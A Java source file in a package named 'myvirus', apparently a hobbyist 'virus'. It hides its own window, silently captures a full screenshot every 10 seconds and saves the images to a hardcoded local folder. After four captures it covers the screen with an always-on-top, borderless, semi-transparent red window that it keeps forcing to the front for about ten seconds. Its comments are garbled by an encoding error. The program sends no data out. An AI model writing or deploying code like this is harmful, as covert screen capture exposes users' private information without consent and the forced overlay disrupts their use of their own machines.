package myvirus;

import java.awt.AWTException;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import javax.imageio.ImageIO;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.Timer;

public class StartVirus {

	public static void main(String[] args) {
		// ������ ������ ����
		new MyFrame();
	}	
}

class MyFrame extends JFrame
{
	// �����
	private Robot rob;
	
	// �������
	private Timer tm, tm1;
	
	// ���������� ����������
	int kol, time = 0;
	
	// ���������� ������
	public MyFrame()
	{
		try {
			// ������ ������ ������
			rob = new Robot();
		} catch (AWTException e) {
			e.printStackTrace();
		}
		
		// ������ ������ � ��������� � 10 ������
		tm = new Timer(10000, new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				// ����� ��� ������ ���������
				saveScreen();
		}});
		// ��������� ������
		tm.start();
		
		// �� ��������� ������ ���������� ��� �������� ����
		setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
		
		// ������ ���� �������
		setVisible(true);
		
		// ����� ��� ������
		setVisible(false);
	}
	
	// ����� ��� ������ ��������� � ���������� ��� � ����
	/**
	 * 
	 */
	private void saveScreen()
	{
		// ������� ���������� ����������
		kol++;
		
		// ���������� ������� ���������� ������
		Dimension dm = Toolkit.getDefaultToolkit().getScreenSize();
		
		int w = dm.width;
		int h = dm.height;
		
		// ������� �������� � ������ � ������� ������ �����
		BufferedImage img = rob.createScreenCapture(new Rectangle(0,0,w,h));
		
		// ��������� �������� � ��� �����
		// "�:\\img" + kol + ".png" 
		try {
			ImageIO.write(img, "PNG", new File("D:\\Files\\MakShish\\Desktop\\screen\\img" + kol + ".png"));
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		// ���� ���������� ������ ������ 3, ��
		if (kol>3)
		{
			// ������������� ������
			tm.stop();
			
			// �������� ����
			JFrame wnd = new JFrame();
			
			// ��������� ����������� ��������� �������� ����
			wnd.setResizable(false);
			
			// ��������� ������ ���� �� ���� �����
			wnd.setBounds(0,0,w,h);
			
			// ��������� ���� ���� �������
			JPanel pan = new JPanel();
			
			pan.setBackground(Color.RED);
			
			wnd.add(pan);
			
			// ������� ����� ����
			wnd.setUndecorated(true);
			
			// ������� ������������ ����
			wnd.setOpacity(0.5f);
			
			// ��������� ���� ������ ������
			wnd.setAlwaysOnTop(true);
			
			// ������� ����
			wnd.setVisible(true);
			
			// ������ ������ � ��������� � 10 ������
			tm1 = new Timer(10, new ActionListener() {
				public void actionPerformed(ActionEvent e) {
					// ����� ���� �� �������� ����
					wnd.toFront();
					time++;
					// �������� ����� ����� �����
					if (time > 1000)
					{
						tm1.stop();
						wnd.setVisible(false);
					}
			}});
			// ��������� ������
			tm1.start();
		}
	}
}